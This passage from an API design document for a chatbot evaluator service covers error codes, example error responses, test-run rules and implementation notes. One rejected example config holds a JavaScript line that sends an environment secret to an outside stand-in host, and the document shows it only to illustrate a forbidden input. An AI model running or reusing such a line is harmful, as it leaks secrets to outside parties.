  "type": "RULE_BASED",
  "rules": [
    {
      "fieldSource": "extracted.mainAnswer",
      "operator": "custom_javascript",
      "config": {
        "javascript": "return fetch('https://example.com/' + process.env.SECRET)"
      }
    }
  ]
}
```

Expected error code:

```text
EVALUATOR_CUSTOM_JAVASCRIPT_FORBIDDEN
```

---

## 26. Relationship with Test Run API

TestRun setup will use evaluator versions as input.

Example future Run Setup field:

```json
{
  "evaluatorVersionIds": [
    "9c7c2f9a-4564-4667-93a8-17a7b85b37bc"
  ],
  "judgeProviderId": "01f18752-67f1-4bda-a139-d88623390068",
  "judgeModel": "gpt-4.1-mini"
}
```

Rules:

```text
1. TestRun validates every evaluatorVersionId belongs to the same project.
2. TestRun locks evaluator versions at creation time.
3. If any evaluator version has LLM Judge config, TestRun must resolve actual judge provider/model.
4. Comparison run must use same evaluator versions and same judge provider/model for all targets.
5. Evaluator business fail does not make TestRun FAILED.
6. Judge parse/timeout/provider error may create JUDGE_ERROR or ERROR testcase result.
```

---

## 27. Stable Error Codes

Evaluator-specific error codes:

```text
EVALUATOR_NOT_FOUND
EVALUATOR_NAME_ALREADY_EXISTS
EVALUATOR_TYPE_IMMUTABLE
EVALUATOR_IN_USE_BY_ACTIVE_RUN
EVALUATOR_VERSION_NOT_FOUND
EVALUATOR_VERSION_IMMUTABLE
EVALUATOR_VERSION_CONFLICT
EVALUATOR_RULE_INVALID
EVALUATOR_OPERATOR_UNSUPPORTED
EVALUATOR_FIELD_SOURCE_INVALID
EVALUATOR_EXPECTED_VALUE_INVALID
EVALUATOR_LLM_JUDGE_CONFIG_INVALID
EVALUATOR_RUBRIC_INVALID
EVALUATOR_CUSTOM_JAVASCRIPT_FORBIDDEN
EVALUATOR_PROVIDER_INVALID
EVALUATOR_VALIDATE_FAILED
```

Common error codes from `01-api-conventions.md` also apply:

```text
VALIDATION_ERROR
AUTHENTICATION_REQUIRED
ACCESS_TOKEN_EXPIRED
PERMISSION_DENIED
RESOURCE_NOT_FOUND
CONFLICT
INVALID_STATE_TRANSITION
INTERNAL_ERROR
DEPENDENCY_UNAVAILABLE
```

---

## 28. Example Problem Details

### 28.1. Custom JavaScript Forbidden

```json
{
  "type": "https://vfqc.vinfast.vn/problems/evaluator-custom-javascript-forbidden",
  "title": "Custom JavaScript evaluator is not allowed",
  "status": 400,
  "detail": "User-provided JavaScript is not supported in MVP evaluator configuration.",
  "instance": "/api/v1/projects/2a7e1a83-7e37-4ef6-82cc-a7771ae7d2e5/evaluators",
  "code": "EVALUATOR_CUSTOM_JAVASCRIPT_FORBIDDEN",
  "traceId": "01J0Z7Y4Y4F9E1S2Y9W8Q7P6A5"
}
```

### 28.2. Invalid Field Source

```json
{
  "type": "https://vfqc.vinfast.vn/problems/evaluator-field-source-invalid",
  "title": "Evaluator field source is invalid",
  "status": 400,
  "detail": "The field source does not exist in the selected response extraction config.",
  "instance": "/api/v1/projects/2a7e1a83-7e37-4ef6-82cc-a7771ae7d2e5/evaluators/validate",
  "code": "EVALUATOR_FIELD_SOURCE_INVALID",
  "traceId": "01J0Z7Y4Y4F9E1S2Y9W8Q7P6A5",
  "errors": [
    {
      "field": "rules[0].fieldSource",
      "code": "UNKNOWN_FIELD_SOURCE",
      "message": "extracted.intent is not configured for the selected chatbot target."
    }
  ]
}
```

### 28.3. LLM Judge Config Invalid

```json
{
  "type": "https://vfqc.vinfast.vn/problems/evaluator-llm-judge-config-invalid",
  "title": "LLM Judge config is invalid",
  "status": 400,
  "detail": "Rubric and output schema are required for LLM Judge evaluator.",
  "instance": "/api/v1/evaluators/8238786d-580b-4f29-b85d-20f6cf4deac0/versions",
  "code": "EVALUATOR_LLM_JUDGE_CONFIG_INVALID",
  "traceId": "01J0Z7Y4Y4F9E1S2Y9W8Q7P6A5",
  "errors": [
    {
      "field": "config.llmJudge.rubric",
      "code": "REQUIRED",
      "message": "Rubric is required."
    }
  ]
}
```

---

## 29. Implementation Notes

```text
1. Create evaluator and version in one transaction.
2. Create evaluator version and evaluator rules in one transaction.
3. Never update evaluator_versions.config_json after creation.
4. Never update evaluator_rules for an existing version after creation.
5. For PATCH /evaluators/{id}, update only evaluator metadata.
6. Use unique(project_id, name) where deleted_at is null.
7. Validate rule order_index uniqueness before persistence.
8. Validate that rule operators are supported by MVP.
9. Validate that field sources are compatible with the selected context when context is provided.
10. Sanitization/masking should run before saving config_json or returning validation errors.
```
